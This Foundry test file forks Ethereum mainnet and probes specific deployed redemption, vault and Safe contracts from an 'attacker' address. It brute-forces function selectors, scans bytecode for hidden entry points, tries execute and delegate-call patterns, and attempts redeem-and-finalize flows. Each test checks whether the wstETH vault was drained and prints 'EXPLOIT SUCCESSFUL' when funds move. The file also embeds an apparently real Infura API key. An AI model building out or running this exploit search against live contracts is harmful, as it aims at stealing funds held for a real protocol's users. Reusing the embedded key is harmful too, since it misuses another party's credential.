// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract Redemption1Entrypoint is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;
    address constant SAFE_AT_SLOT4 = 0xB38f2aCb7B562475908c0C6E80a045Deb4023f70;
    address constant IMPLEMENTATION = 0x434B68B11bBE8FD3074089397cA3d275801d6354;
    address constant TIMELOCK = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_Investigate411557d1() public {
        console.log("=== INVESTIGATING SELECTOR 0x411557d1 ===\n");

        // This selector succeeded on REDEMPTION_1
        (bool s1, bytes memory d1) = REDEMPTION_1.staticcall(
            abi.encodeWithSelector(bytes4(0x411557d1))
        );
        if (s1) {
            console.log("Result:", abi.decode(d1, (uint256)));
        }

        // Try calling with parameters
        (bool s2, bytes memory d2) = REDEMPTION_1.staticcall(
            abi.encodeWithSelector(bytes4(0x411557d1), attacker)
        );
        if (s2) {
            console.log("With address param:", d2.length);
        }

        // Try as a write function
        vm.startPrank(attacker);
        (bool s3, bytes memory d3) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0x411557d1))
        );
        console.log("As write function:", s3);
        if (!s3 && d3.length >= 4) {
            console.logBytes4(bytes4(d3));
        }
        vm.stopPrank();
    }

    function test_FindRedemption1RedeemFunction() public {
        console.log("=== FINDING REDEMPTION_1 REDEEM FUNCTION ===\n");

        // Standard redemption selectors
        bytes4[] memory redeemSels = new bytes4[](10);
        redeemSels[0] = bytes4(keccak256("redeem(uint256)"));
        redeemSels[1] = bytes4(keccak256("redeem(uint96)"));
        redeemSels[2] = bytes4(keccak256("redeem(uint256,address)"));
        redeemSels[3] = bytes4(keccak256("finalizeRedeem(uint256)"));
        redeemSels[4] = bytes4(keccak256("claimRedeem(uint256)"));
        redeemSels[5] = bytes4(keccak256("executeRedeem(uint256)"));
        redeemSels[6] = bytes4(keccak256("processRedeem(uint256)"));
        redeemSels[7] = bytes4(keccak256("withdraw(uint256)"));
        redeemSels[8] = bytes4(keccak256("withdraw(uint256,address)"));
        redeemSels[9] = bytes4(keccak256("claim(uint256)"));

        console.log("Testing redeem selectors:");
        for (uint i = 0; i < redeemSels.length; i++) {
            (bool s, bytes memory d) = REDEMPTION_1.call(
                abi.encodeWithSelector(redeemSels[i], 100e18, attacker)
            );
            if (s || (d.length >= 4 && bytes4(d) != bytes4(0))) {
                console.log("Response for:");
                console.logBytes4(redeemSels[i]);
                if (s) console.log("  SUCCESS!");
                else console.logBytes4(bytes4(d));
            }
        }
    }

    function test_TryRedemption1WithIAU() public {
        console.log("=== TRYING REDEMPTION_1 WITH IAU ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18);

        // Give attacker IAU tokens
        deal(IAU, attacker, 100000e18);

        vm.startPrank(attacker);
        IERC20(IAU).approve(REDEMPTION_1, type(uint256).max);

        // Try redeem(uint96) - the standard redemption function
        (bool s1, bytes memory d1) = REDEMPTION_1.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(100e18))
        );
        console.log("redeem(uint96):", s1);
        if (!s1 && d1.length >= 4) {
            console.logBytes4(bytes4(d1));
        }

        // Try redeem(uint256)
        (bool s2, bytes memory d2) = REDEMPTION_1.call(
            abi.encodeWithSignature("redeem(uint256)", 100e18)
        );
        console.log("redeem(uint256):", s2);
        if (!s2 && d2.length >= 4) {
            console.logBytes4(bytes4(d2));
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerWstETH = IERC20(wstETH).balanceOf(attacker);
        console.log("\nVault after:", vaultAfter / 1e18);
        console.log("Attacker wstETH:", attackerWstETH / 1e18);
    }

    function test_CheckSafeAtSlot4() public view {
        console.log("=== CHECKING SAFE AT SLOT 4 ===\n");

        console.log("Safe address:", SAFE_AT_SLOT4);
        console.log("Code size:", SAFE_AT_SLOT4.code.length);

        // Get Safe info
        (bool s1, bytes memory d1) = SAFE_AT_SLOT4.staticcall(
            abi.encodeWithSignature("getOwners()")
        );
        if (s1) {
            address[] memory owners = abi.decode(d1, (address[]));
            console.log("Owners:", owners.length);
            for (uint i = 0; i < owners.length && i < 5; i++) {
                console.log("  ", owners[i]);
            }
        }

        (bool s2, bytes memory d2) = SAFE_AT_SLOT4.staticcall(
            abi.encodeWithSignature("getThreshold()")
        );
        if (s2) {
            console.log("Threshold:", abi.decode(d2, (uint256)));
        }

        // Check if REDEMPTION_1 is a module of this Safe
        (bool s3, bytes memory d3) = SAFE_AT_SLOT4.staticcall(
            abi.encodeWithSignature("isModuleEnabled(address)", REDEMPTION_1)
        );
        if (s3 && d3.length >= 32) {
            console.log("REDEMPTION_1 is module:", abi.decode(d3, (bool)));
        }

        // Check if any attacker-controllable address is a module
        (bool s4, bytes memory d4) = SAFE_AT_SLOT4.staticcall(
            abi.encodeWithSignature("getModulesPaginated(address,uint256)", address(0x1), 10)
        );
        if (s4) {
            console.log("Modules result length:", d4.length);
            console.logBytes(d4);
        }
    }

    function test_AnalyzeRedemption1RCCallPath() public view {
        console.log("=== ANALYZING REDEMPTION_1 RC CALL PATH ===\n");

        bytes memory code = REDEMPTION_1.code;

        // RC.redeem selector = 0x7bde82f2
        bytes4 rcRedeem = bytes4(0x7bde82f2);

        console.log("Searching for RC.redeem selector in REDEMPTION_1:");

        for (uint i = 0; i + 4 < code.length; i++) {
            if (uint8(code[i]) == 0x63) { // PUSH4
                bytes4 sel = bytes4(bytes.concat(
                    code[i+1], code[i+2], code[i+3], code[i+4]
                ));
                if (sel == rcRedeem) {
                    console.log("Found at offset:", i);

                    // Look for CALL after
                    for (uint j = i; j < i + 100 && j < code.length; j++) {
                        if (uint8(code[j]) == 0xf1) {
                            console.log("  CALL at:", j);
                            break;
                        }
                    }

                    // Look for function entry
                    console.log("  Looking for entry point...");
                    uint searchStart = i > 2000 ? i - 2000 : 0;
                    for (uint k = searchStart; k < i; k++) {
                        if (uint8(code[k]) == 0x5b) { // JUMPDEST
                            // This might be a function entry
                        }
                    }
                }
            }
        }
    }

    function test_TrySafeDelegateCall() public {
        console.log("=== TRYING SAFE DELEGATE CALL ===\n");

        // If REDEMPTION_1 uses the Safe at slot 4 for some operation,
        // and we can call REDEMPTION_1 to trigger that path...

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        // Try calling REDEMPTION_1 with data that might pass to Safe
        vm.startPrank(attacker);

        // Try execTransaction-like patterns
        bytes memory rcCall = abi.encodeWithSignature(
            "redeem(uint256,address)",
            1000e18,
            attacker
        );

        (bool s1, bytes memory d1) = REDEMPTION_1.call(
            abi.encodeWithSignature(
                "execute(address,uint256,bytes,uint8)",
                REDEMPTION_CONTROLLER,
                0,
                rcCall,
                0
            )
        );
        console.log("execute pattern:", s1);
        if (!s1 && d1.length >= 4) console.logBytes4(bytes4(d1));

        (bool s2, bytes memory d2) = REDEMPTION_1.call(
            abi.encodeWithSignature(
                "call(address,bytes)",
                REDEMPTION_CONTROLLER,
                rcCall
            )
        );
        console.log("call pattern:", s2);
        if (!s2 && d2.length >= 4) console.logBytes4(bytes4(d2));

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        console.log("\nVault change:", int256(vaultAfter) - int256(vaultBefore));
    }

    function test_FindFinalizeRedeemInRedemption1() public view {
        console.log("=== FINDING FINALIZEREDEEM IN REDEMPTION_1 ===\n");

        bytes memory code = REDEMPTION_1.code;

        // finalizeRedeem selector
        bytes4 finalizeSel = bytes4(keccak256("finalizeRedeem(uint256)"));
        console.log("finalizeRedeem selector:");
        console.logBytes4(finalizeSel);

        for (uint i = 0; i + 4 < code.length; i++) {
            if (uint8(code[i]) == 0x63) {
                bytes4 sel = bytes4(bytes.concat(
                    code[i+1], code[i+2], code[i+3], code[i+4]
                ));
                if (sel == finalizeSel) {
                    console.log("Found finalizeRedeem at:", i);
                }
            }
        }

        // Also look for all PUSH4s that might be function dispatches
        console.log("\nAll function selectors in REDEMPTION_1:");
        bytes4[] memory found = new bytes4[](50);
        uint foundCount = 0;

        for (uint i = 0; i + 4 < code.length && foundCount < 50; i++) {
            if (uint8(code[i]) == 0x63) {
                bytes4 sel = bytes4(bytes.concat(
                    code[i+1], code[i+2], code[i+3], code[i+4]
                ));
                if (sel == bytes4(0) || sel == bytes4(0xffffffff)) continue;
                if (uint32(sel) < 0x1000) continue;

                bool isNew = true;
                for (uint j = 0; j < foundCount; j++) {
                    if (found[j] == sel) {
                        isNew = false;
                        break;
                    }
                }
                if (isNew) {
                    found[foundCount++] = sel;
                }
            }
        }

        for (uint i = 0; i < foundCount; i++) {
            console.logBytes4(found[i]);
        }
    }

    function test_BruteForceSelectors() public {
        console.log("=== BRUTE FORCE SELECTOR TESTING ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        // Known selectors from analysis
        bytes4[] memory sels = new bytes4[](20);
        sels[0] = bytes4(0x8da5cb5b); // owner
        sels[1] = bytes4(0xe30c3978); // pendingOwner
        sels[2] = bytes4(0xf2fde38b); // transferOwnership
        sels[3] = bytes4(0x715018a6); // renounceOwnership
        sels[4] = bytes4(0x79ba5097); // acceptOwnership
        sels[5] = bytes4(0xddca3f43); // fee
        sels[6] = bytes4(0x69fe0e2d); // setFee
        sels[7] = bytes4(0x781b7e08); // unknown
        sels[8] = bytes4(0x43000818); // unknown
        sels[9] = bytes4(0x411557d1); // unknown - returned 32 bytes
        sels[10] = bytes4(0x388aef5c);
        sels[11] = bytes4(0x39967573);
        sels[12] = bytes4(0x70a08231); // balanceOf
        sels[13] = bytes4(0xb2118a8d);
        sels[14] = bytes4(0x04824e70);
        sels[15] = bytes4(0x68742da6);
        sels[16] = bytes4(0xfc82f084);
        sels[17] = bytes4(0xf4a739cb);
        sels[18] = bytes4(0x8cd4426d);
        sels[19] = bytes4(0xa0cf0aea); // execute

        console.log("Testing selectors with attacker params:");
        vm.startPrank(attacker);

        for (uint i = 0; i < sels.length; i++) {
            // Try with address parameter
            (bool s, bytes memory d) = REDEMPTION_1.call{gas: 500000}(
                abi.encodeWithSelector(sels[i], attacker, 100e18)
            );
            if (s) {
                console.log("SUCCESS with:");
                console.logBytes4(sels[i]);
            }
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerWstETH = IERC20(wstETH).balanceOf(attacker);

        console.log("\nVault before:", vaultBefore / 1e18);
        console.log("Vault after:", vaultAfter / 1e18);
        console.log("Attacker wstETH:", attackerWstETH / 1e18);

        if (vaultAfter < vaultBefore) {
            console.log("*** VAULT WAS DRAINED! ***");
        }
    }

    function test_CreateAndFinalizeRedeem() public {
        console.log("=== CREATE AND FINALIZE REDEEM TEST ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18);

        deal(IAU, attacker, 100000e18);

        vm.startPrank(attacker);
        IERC20(IAU).approve(REDEMPTION_1, type(uint256).max);

        // Step 1: Create redemption request
        console.log("\nStep 1: Creating redemption...");
        (bool s1, bytes memory d1) = REDEMPTION_1.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(1000e18))
        );
        console.log("redeem(uint96):", s1);
        if (!s1 && d1.length >= 4) {
            console.logBytes4(bytes4(d1));
            console.log("Error:", string(d1));
        }

        vm.stopPrank();

        if (s1) {
            // Step 2: Wait for redemption period
            console.log("\nStep 2: Advancing time...");
            vm.warp(block.timestamp + 8 days);

            vm.startPrank(attacker);

            // Step 3: Finalize redemption
            console.log("\nStep 3: Finalizing...");
            (bool s2, bytes memory d2) = REDEMPTION_1.call(
                abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
            );
            console.log("finalizeRedeem:", s2);
            if (!s2 && d2.length >= 4) {
                console.logBytes4(bytes4(d2));
            }

            vm.stopPrank();

            uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
            uint256 attackerWstETH = IERC20(wstETH).balanceOf(attacker);

            console.log("\nVault after:", vaultAfter / 1e18);
            console.log("Attacker wstETH:", attackerWstETH / 1e18);

            if (attackerWstETH > 0) {
                console.log("\n*** EXPLOIT SUCCESSFUL! ***");
            }
        }
    }
}
